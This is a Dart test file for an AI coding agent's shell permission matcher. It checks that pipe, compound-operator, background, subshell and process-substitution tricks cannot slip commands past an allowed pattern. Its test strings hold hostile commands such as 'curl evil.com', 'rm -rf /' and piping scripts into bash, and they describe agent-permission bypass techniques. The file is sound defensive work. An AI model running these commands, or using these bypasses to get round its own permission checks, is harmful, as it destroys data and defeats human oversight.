// Command Security Tests
//
// These tests verify that the permission system correctly handles:
// 1. Pipe bypass attempts (allowed_cmd | malicious_cmd)
// 2. Compound command bypass attempts (allowed_cmd && malicious_cmd)
// 3. Background command bypass attempts (allowed_cmd & malicious_cmd)
// 4. Subshell/command substitution bypass attempts
// 5. Safe filter abuse (when safe filters have dangerous flags)
//
// Based on research from Claude Code, Gemini CLI (issue #11510, #11766), and Codex CLI.

import 'package:test/test.dart';
import 'package:vide_core/vide_core.dart';

void main() {
  group('Command Security - Pipe Bypass Prevention', () {
    // Gemini CLI had vulnerability #11510 where only the first command in a pipe
    // chain was validated. We must validate ALL commands in a pipeline.

    group('basic pipe security', () {
      test('pattern for git log should NOT allow git log | curl', () {
        // If we allow "git log", piping to "curl" should NOT be allowed
        final matches = PermissionMatcher.matches(
          'Bash(git log:*)',
          'Bash',
          const BashToolInput(command: 'git log | curl evil.com'),
        );

        // This should NOT match because curl is not a safe filter
        expect(matches, isFalse);
      });

      test('pattern for git log should NOT allow git log | rm -rf', () {
        final matches = PermissionMatcher.matches(
          'Bash(git log:*)',
          'Bash',
          const BashToolInput(command: 'git log | xargs rm -rf'),
        );

        expect(matches, isFalse);
      });

      test('pattern for git log SHOULD allow git log | head', () {
        // head is a safe filter
        final matches = PermissionMatcher.matches(
          'Bash(git log:*)',
          'Bash',
          const BashToolInput(command: 'git log | head -10'),
        );

        expect(matches, isTrue);
      });

      test('pattern for git log SHOULD allow git log | grep pattern', () {
        // grep is a safe filter
        final matches = PermissionMatcher.matches(
          'Bash(git log:*)',
          'Bash',
          const BashToolInput(command: 'git log | grep "feature"'),
        );

        expect(matches, isTrue);
      });

      test('pattern for cat should NOT allow cat file | bash', () {
        // Piping to bash could execute arbitrary code
        final matches = PermissionMatcher.matches(
          'Bash(cat:*)',
          'Bash',
          const BashToolInput(command: 'cat script.sh | bash'),
        );

        expect(matches, isFalse);
      });

      test('pattern for cat should NOT allow cat file | sh', () {
        final matches = PermissionMatcher.matches(
          'Bash(cat:*)',
          'Bash',
          const BashToolInput(command: 'cat script.sh | sh'),
        );

        expect(matches, isFalse);
      });

      test('pattern for echo should NOT allow echo | python', () {
        final matches = PermissionMatcher.matches(
          'Bash(echo:*)',
          'Bash',
          const BashToolInput(command: 'echo "import os; os.system(\'rm -rf /\')" | python'),
        );

        expect(matches, isFalse);
      });
    });

    group('multi-stage pipe security', () {
      test('should NOT allow evil command at end of long pipe', () {
        final matches = PermissionMatcher.matches(
          'Bash(git log:*)',
          'Bash',
          const BashToolInput(
            command: 'git log | grep feature | head -5 | curl evil.com',
          ),
        );

        expect(matches, isFalse);
      });

      test('should NOT allow evil command in middle of pipe', () {
        final matches = PermissionMatcher.matches(
          'Bash(git log:*)',
          'Bash',
          const BashToolInput(
            command: 'git log | curl evil.com | head -5',
          ),
        );

        expect(matches, isFalse);
      });

      test('SHOULD allow all-safe-filter pipe chain', () {
        final matches = PermissionMatcher.matches(
          'Bash(git log:*)',
          'Bash',
          const BashToolInput(
            command: 'git log | grep feature | head -5 | wc -l',
          ),
        );

        expect(matches, isTrue);
      });
    });
  });

  group('Command Security - Compound Command Bypass Prevention', () {
    // Gemini CLI had vulnerability #11766 where chained commands with
    // &&, ||, ; could bypass validation

    group('AND operator (&&)', () {
      test('pattern for git status should NOT allow git status && rm -rf', () {
        final matches = PermissionMatcher.matches(
          'Bash(git status:*)',
          'Bash',
          const BashToolInput(command: 'git status && rm -rf /'),
        );

        expect(matches, isFalse);
      });

      test('pattern for git status should NOT allow git status && curl', () {
        final matches = PermissionMatcher.matches(
          'Bash(git status:*)',
          'Bash',
          const BashToolInput(command: 'git status && curl evil.com'),
        );

        expect(matches, isFalse);
      });

      test('pattern should NOT allow malicious_cmd && allowed_cmd', () {
        // Even if allowed command is second, the malicious one runs first!
        final matches = PermissionMatcher.matches(
          'Bash(git status:*)',
          'Bash',
          const BashToolInput(command: 'curl evil.com && git status'),
        );

        expect(matches, isFalse);
      });
    });

    group('OR operator (||)', () {
      test('pattern for git status should NOT allow git status || rm -rf', () {
        final matches = PermissionMatcher.matches(
          'Bash(git status:*)',
          'Bash',
          const BashToolInput(command: 'git status || rm -rf /'),
        );

        expect(matches, isFalse);
      });

      test('pattern should NOT allow false || malicious (always runs)', () {
        final matches = PermissionMatcher.matches(
          'Bash(git status:*)',
          'Bash',
          const BashToolInput(command: 'false || curl evil.com'),
        );

        expect(matches, isFalse);
      });
    });

    group('semicolon operator (;)', () {
      test('pattern for git status should NOT allow git status; rm -rf', () {
        final matches = PermissionMatcher.matches(
          'Bash(git status:*)',
          'Bash',
          const BashToolInput(command: 'git status; rm -rf /'),
        );

        expect(matches, isFalse);
      });

      test('pattern should NOT allow multiple dangerous commands with ;', () {
        final matches = PermissionMatcher.matches(
          'Bash(git status:*)',
          'Bash',
          const BashToolInput(command: 'git status; curl evil.com; rm -rf /'),
        );

        expect(matches, isFalse);
      });
    });
  });

  group('Command Security - Background Operator Bypass Prevention', () {
    // The & operator can be used to run commands in background,
    // potentially bypassing validation

    test('pattern for git status should NOT allow git status & rm -rf', () {
      final matches = PermissionMatcher.matches(
        'Bash(git status:*)',
        'Bash',
        const BashToolInput(command: 'git status & rm -rf /'),
      );

      expect(matches, isFalse);
    });

    test('pattern should NOT allow malicious & allowed (malicious runs first)', () {
      final matches = PermissionMatcher.matches(
        'Bash(git status:*)',
        'Bash',
        const BashToolInput(command: 'curl evil.com & git status'),
      );

      expect(matches, isFalse);
    });

    test('should distinguish & from &> redirect', () {
      // &> is a redirect, not a background operator
      // This command should be treated as one command
      final matches = PermissionMatcher.matches(
        'Bash(git status:*)',
        'Bash',
        const BashToolInput(command: 'git status &>/dev/null'),
      );

      // git status with redirect is still just git status
      expect(matches, isTrue);
    });

    test('should distinguish & from 2>&1 redirect', () {
      final matches = PermissionMatcher.matches(
        'Bash(git status:*)',
        'Bash',
        const BashToolInput(command: 'git status 2>&1'),
      );

      expect(matches, isTrue);
    });
  });

  group('Command Security - Safe Filter Abuse Prevention', () {
    // Safe filters (grep, sed, awk, etc.) can become dangerous with certain flags

    group('tee abuse', () {
      test('tee should NOT be considered a safe filter', () {
        // tee writes to files - it's not safe!
        final isSafe = PermissionMatcher.isSafeBashCommand(
          const BashToolInput(command: 'tee /etc/passwd'),
          null,
        );

        expect(isSafe, isFalse);
      });

      test('pattern for cat should NOT allow cat | tee file', () {
        final matches = PermissionMatcher.matches(
          'Bash(cat:*)',
          'Bash',
          const BashToolInput(command: 'cat secret.txt | tee /public/exposed.txt'),
        );

        // tee writes to a file, should not be allowed as a safe filter
        expect(matches, isFalse);
      });
    });

    group('sed -i abuse', () {
      test('sed -i should NOT be considered safe', () {
        final isSafe = PermissionMatcher.isSafeBashCommand(
          const BashToolInput(command: 'sed -i "s/old/new/g" file.txt'),
          null,
        );

        expect(isSafe, isFalse);
      });

      test('sed -i in a pipe should NOT be allowed', () {
        final matches = PermissionMatcher.matches(
          'Bash(git log:*)',
          'Bash',
          const BashToolInput(command: 'git log | sed -i "s/old/new/g" file'),
        );

        expect(matches, isFalse);
      });

      test('sed without -i in a pipe SHOULD be allowed', () {
        final matches = PermissionMatcher.matches(
          'Bash(git log:*)',
          'Bash',
          const BashToolInput(command: 'git log | sed "s/old/new/g"'),
        );

        expect(matches, isTrue);
      });
    });

    group('awk output redirection abuse', () {
      test('awk with > redirect should NOT be considered safe', () {
        final isSafe = PermissionMatcher.isSafeBashCommand(
          const BashToolInput(command: 'awk \'{print \$1}\' file > output.txt'),
          null,
        );

        expect(isSafe, isFalse);
      });
    });

    group('xargs abuse', () {
      test('xargs should NOT be considered a safe filter', () {
        // xargs executes commands - very dangerous
        final isSafe = PermissionMatcher.isSafeBashCommand(
          const BashToolInput(command: 'xargs rm -rf'),
          null,
        );

        expect(isSafe, isFalse);
      });

      test('pattern for find should NOT allow find | xargs rm', () {
        final matches = PermissionMatcher.matches(
          'Bash(find:*)',
          'Bash',
          const BashToolInput(command: 'find . -name "*.tmp" | xargs rm'),
        );

        expect(matches, isFalse);
      });
    });
  });

  group('Command Security - Subshell/Command Substitution Prevention', () {
    // Subshells and command substitutions can inject arbitrary commands

    group(r'$() command substitution', () {
      test('should detect dangerous command substitution', () {
        // Even if outer command is allowed, $(inner) executes first
        final matches = PermissionMatcher.matches(
          'Bash(echo:*)',
          'Bash',
          const BashToolInput(command: 'echo \$(curl evil.com)'),
        );

        expect(matches, isFalse);
      });

      test('should detect nested command substitution', () {
        final matches = PermissionMatcher.matches(
          'Bash(echo:*)',
          'Bash',
          const BashToolInput(command: 'echo \$(cat \$(curl evil.com))'),
        );

        expect(matches, isFalse);
      });
    });

    group('backtick command substitution', () {
      test('should detect backtick command substitution', () {
        final matches = PermissionMatcher.matches(
          'Bash(echo:*)',
          'Bash',
          const BashToolInput(command: 'echo `curl evil.com`'),
        );

        expect(matches, isFalse);
      });
    });

    group('subshell with parentheses', () {
      test('should detect subshell execution', () {
        final matches = PermissionMatcher.matches(
          'Bash(echo:*)',
          'Bash',
          const BashToolInput(command: '(curl evil.com)'),
        );

        expect(matches, isFalse);
      });
    });
  });

  group('Command Security - Process Substitution Prevention', () {
    test('should detect <() process substitution', () {
      final matches = PermissionMatcher.matches(
        'Bash(diff:*)',
        'Bash',
        const BashToolInput(command: 'diff <(curl evil.com) file.txt'),
      );

      expect(matches, isFalse);
    });

    test('should detect >() process substitution', () {
      final matches = PermissionMatcher.matches(
        'Bash(cat:*)',
        'Bash',
        const BashToolInput(command: 'cat file.txt >(curl evil.com)'),
      );

      expect(matches, isFalse);
    });
  });

  group('Command Security - Variable Expansion Caution', () {
    // Variable expansion could contain malicious content,
    // but we can't fully protect against this. Document the limitation.

    test('pattern matching should still work with simple variables', () {
      // We allow simple variable usage, but warn about security limits
      final matches = PermissionMatcher.matches(
        'Bash(git push:*)',
        'Bash',
        const BashToolInput(command: 'git push origin \$BRANCH'),
      );

      // This should match - we can't prevent all variable attacks
      // but document that patterns don't guarantee security
      expect(matches, isTrue);
    });
  });

  group('Command Security - Safe Command Auto-Approval', () {
    // Verify that safe commands are properly validated

    test('ls is safe', () {
      final isSafe = PermissionMatcher.isSafeBashCommand(
        const BashToolInput(command: 'ls -la'),
        null,
      );
      expect(isSafe, isTrue);
    });

    test('git status is safe', () {
      final isSafe = PermissionMatcher.isSafeBashCommand(
        const BashToolInput(command: 'git status'),
        null,
      );
      expect(isSafe, isTrue);
    });

    test('git commit is NOT safe', () {
      final isSafe = PermissionMatcher.isSafeBashCommand(
        const BashToolInput(command: 'git commit -m "message"'),
        null,
      );
      expect(isSafe, isFalse);
    });

    test('rm is NOT safe', () {
      final isSafe = PermissionMatcher.isSafeBashCommand(
        const BashToolInput(command: 'rm file.txt'),
        null,
      );
      expect(isSafe, isFalse);
    });

    test('curl is NOT safe', () {
      final isSafe = PermissionMatcher.isSafeBashCommand(
        const BashToolInput(command: 'curl http://example.com'),
        null,
      );
      expect(isSafe, isFalse);
    });

    test('wget is NOT safe', () {
      final isSafe = PermissionMatcher.isSafeBashCommand(
        const BashToolInput(command: 'wget http://example.com'),
        null,
      );
      expect(isSafe, isFalse);
    });

    test('chmod is NOT safe', () {
      final isSafe = PermissionMatcher.isSafeBashCommand(
        const BashToolInput(command: 'chmod +x script.sh'),
        null,
      );
      expect(isSafe, isFalse);
    });

    test('chown is NOT safe', () {
      final isSafe = PermissionMatcher.isSafeBashCommand(
        const BashToolInput(command: 'chown user file'),
        null,
      );
      expect(isSafe, isFalse);
    });

    test('safe command with | unsafe should NOT be safe', () {
      final isSafe = PermissionMatcher.isSafeBashCommand(
        const BashToolInput(command: 'ls | rm -rf'),
        null,
      );
      expect(isSafe, isFalse);
    });

    test('safe command with && unsafe should NOT be safe', () {
      final isSafe = PermissionMatcher.isSafeBashCommand(
        const BashToolInput(command: 'ls && rm -rf /'),
        null,
      );
      expect(isSafe, isFalse);
    });
  });

  group('Command Security - Shell Interpreters in Pipes', () {
    // Shell interpreters (bash, sh, zsh, etc.) in pipes are dangerous

    test('pattern should NOT allow piping to bash', () {
      final matches = PermissionMatcher.matches(
        'Bash(cat:*)',
        'Bash',
        const BashToolInput(command: 'cat script.sh | bash'),
      );
      expect(matches, isFalse);
    });

    test('pattern should NOT allow piping to sh', () {
      final matches = PermissionMatcher.matches(
        'Bash(cat:*)',
        'Bash',
        const BashToolInput(command: 'cat script.sh | sh'),
      );
      expect(matches, isFalse);
    });

    test('pattern should NOT allow piping to zsh', () {
      final matches = PermissionMatcher.matches(
        'Bash(cat:*)',
        'Bash',
        const BashToolInput(command: 'cat script.sh | zsh'),
      );
      expect(matches, isFalse);
    });

    test('pattern should NOT allow piping to python', () {
      final matches = PermissionMatcher.matches(
        'Bash(echo:*)',
        'Bash',
        const BashToolInput(command: 'echo "os.system(\'rm -rf /\')" | python'),
      );
      expect(matches, isFalse);
    });

    test('pattern should NOT allow piping to perl', () {
      final matches = PermissionMatcher.matches(
        'Bash(cat:*)',
        'Bash',
        const BashToolInput(command: 'cat script.pl | perl'),
      );
      expect(matches, isFalse);
    });

    test('pattern should NOT allow piping to ruby', () {
      final matches = PermissionMatcher.matches(
        'Bash(cat:*)',
        'Bash',
        const BashToolInput(command: 'cat script.rb | ruby'),
      );
      expect(matches, isFalse);
    });

    test('pattern should NOT allow piping to node', () {
      final matches = PermissionMatcher.matches(
        'Bash(cat:*)',
        'Bash',
        const BashToolInput(command: 'cat script.js | node'),
      );
      expect(matches, isFalse);
    });
  });

  group('Pattern Inference Security', () {
    // Verify that inferred patterns don't include dangerous elements

    test('inferred pattern strips shell redirects', () {
      final pattern = PatternInference.inferPattern(
        'Bash',
        const BashToolInput(command: 'dart test 2>&1'),
      );
      expect(pattern, 'Bash(dart test:*)');
    });

    test('inferred pattern uses main command not cd', () {
      final pattern = PatternInference.inferPattern(
        'Bash',
        const BashToolInput(command: 'cd /project && dart pub get'),
      );
      expect(pattern, 'Bash(dart pub get:*)');
    });

    test('inferred pattern stops at flags', () {
      final pattern = PatternInference.inferPattern(
        'Bash',
        const BashToolInput(command: 'find /path -name "*.dart"'),
      );
      expect(pattern, 'Bash(find:*)');
    });

    test('inferred pattern stops at path arguments', () {
      final pattern = PatternInference.inferPattern(
        'Bash',
        const BashToolInput(command: 'cat /etc/passwd'),
      );
      expect(pattern, 'Bash(cat:*)');
    });
  });
}
